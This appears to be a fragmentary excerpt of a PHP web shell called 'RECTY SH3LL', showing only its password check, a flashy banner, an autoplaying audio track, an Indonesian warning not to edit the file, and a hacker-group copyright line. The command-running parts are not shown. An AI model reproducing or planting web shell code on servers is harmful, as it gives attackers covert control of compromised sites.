...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?xXx RECTY SH3LL xXx'</script>";
...
<link rel="icon" type="image/gif" href="https://i.top4top.io/p_1582m0cr80.jpg"><br>

<link href="" rel="stylesheet" type="text/css">

<title>RECTY SH3LL</title><link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet"> 

<center><p class="blink_text" style="font-size:45px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Iceland;">RECTY SH3LL</font></center>

<marquee><font face="kelly slab" color="white" size="5">Jangan di ubah Nanti Shellmya error broo</marquee>

<center><audio controls="controls" autoplay="autoplay" src="https://b.top4top.io/m_1687jcbjc0.mp3" type="audio/mpeg"></audio></center>
...
echo '<font color="white" size="2px"><center><br/><b>Copyright &copy;2K20 #OFFICIAL CCT | <font color="lime">RECTY</a></center></font>
